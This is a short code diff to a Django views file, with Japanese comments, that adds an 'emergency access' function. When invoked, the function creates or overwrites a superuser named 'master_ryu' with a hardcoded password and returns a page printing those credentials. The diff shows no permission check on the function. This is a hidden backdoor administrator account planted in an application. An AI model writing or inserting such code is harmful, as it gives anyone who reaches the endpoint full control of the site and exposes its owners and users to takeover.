@@ -966,3 +966,18 @@ class CustomLoginView(LoginView):
             return '/admin/'
         # 一般ユーザーならいつものホーム画面へ！
         return reverse_lazy('index')
+
+
+# --- 緊急アクセス用の秘密の関数 ---
+def emergency_admin(request):
+    from django.contrib.auth.models import User
+    from django.http import HttpResponse
+
+    # 'master_ryu' という最強管理者を作る（すでにいれば上書き）
+    user, created = User.objects.get_or_create(username='master_ryu')
+    user.set_password('ryutter2026')  # 仮のパスワード
+    user.is_superuser = True
+    user.is_staff = True
+    user.save()
+
+    return HttpResponse("秘密の鍵が開きました！ /admin/ にアクセスして master_ryu / ryutter2026 でログインしてください。")
